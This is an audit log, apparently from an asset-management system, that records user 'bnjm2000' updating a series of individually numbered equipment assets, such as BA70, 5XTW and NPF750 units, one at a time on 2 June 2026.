2026/06/02 19:18:03,bnjm2000,Updated asset BA70#05; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 19:18:03,bnjm2000,Updated asset BA70#06; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 19:18:03,bnjm2000,Updated asset BA70#07; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 19:18:03,bnjm2000,Updated asset BA70#08; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 19:18:04,bnjm2000,Updated asset BA70#09; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 19:18:04,bnjm2000,Updated asset BA70#10; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 19:18:04,bnjm2000,Updated asset BA70#11; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 19:18:04,bnjm2000,Updated asset BA70#12; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 19:18:04,bnjm2000,Updated asset BA70#13; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 19:18:05,bnjm2000,Updated asset BA70#14; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 19:18:05,bnjm2000,Updated asset BA70#15; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 19:18:05,bnjm2000,Updated asset BA70#16; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 19:18:05,bnjm2000,Updated asset BA70#17; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 19:18:05,bnjm2000,Updated asset BA70#18; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 19:18:06,bnjm2000,Updated asset BA70#19; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 19:18:06,bnjm2000,Updated asset BA70#20; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 19:19:36,bnjm2000,Updated asset ME36#03; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 19:19:36,bnjm2000,Updated asset ME36#04; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 19:20:05,bnjm2000,Updated asset NPF750#01; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 19:20:06,bnjm2000,Updated asset NPF750#02; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 19:20:06,bnjm2000,Updated asset NPF750#03; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 19:20:06,bnjm2000,Updated asset NPF750#04; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 19:20:06,bnjm2000,Updated asset NPFCHARGER#01; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 19:20:07,bnjm2000,Updated asset NPFCHARGER#02; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 19:22:21,bnjm2000,Updated asset 5XTW#17; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 19:22:21,bnjm2000,Updated asset 5XTW#18; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 19:22:21,bnjm2000,Updated asset 5XTW#19; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 19:22:22,bnjm2000,Updated asset 5XTW#20; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 19:22:22,bnjm2000,Updated asset ETR5W#17; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 19:22:22,bnjm2000,Updated asset ETR5W#18; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 19:22:22,bnjm2000,Updated asset ETR5W#19; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 19:22:23,bnjm2000,Updated asset ETR5W#20; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 19:26:41,bnjm2000,Updated asset 5XTW#01; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 19:26:41,bnjm2000,Updated asset 5XTW#02; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 19:26:42,bnjm2000,Updated asset 5XTW#03; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 19:26:42,bnjm2000,Updated asset 5XTW#04; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 19:26:42,bnjm2000,Updated asset 5XTW#05; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 19:26:42,bnjm2000,Updated asset 5XTW#06; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 19:26:42,bnjm2000,Updated asset 5XTW#07; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 19:26:43,bnjm2000,Updated asset 5XTW#08; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 19:26:43,bnjm2000,Updated asset 5XTW#09; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 19:26:43,bnjm2000,Updated asset 5XTW#10; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 19:26:43,bnjm2000,Updated asset 5XTW#11; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 19:26:44,bnjm2000,Updated asset 5XTW#12; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 19:26:44,bnjm2000,Updated asset 5XTW#13; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 19:26:44,bnjm2000,Updated asset 5XTW#14; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 19:26:44,bnjm2000,Updated asset 5XTW#15; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/02 19:26:45,bnjm2000,Updated asset 5XTW#16; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
